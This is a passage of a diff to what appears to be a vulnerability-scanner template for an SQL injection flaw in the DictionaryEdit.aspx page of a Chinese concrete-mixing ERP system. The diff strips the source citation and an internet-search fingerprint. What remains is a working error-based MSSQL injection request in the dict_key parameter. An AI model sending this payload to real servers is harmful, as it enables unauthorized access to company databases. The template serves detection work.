@@ -3,12 +3,8 @@ info:
   name: 商混ERP系统sys接口 SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/xril3abgedza7u2h'
+  description: ''
   tags: sqli,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: xril3abgedza7u2h
-    fofa: ZoomEye:app:"商混ERP系统"
 http:
 - raw:
   - 'GET /Sys/DictionaryEdit.aspx?dict_key=1%27%20and%201=convert(varchar(100),substring(sys.fn_sqlvarbasetostr(HashBytes(%27MD5%27,%27123456%27)),3,32))-- HTTP/1.1
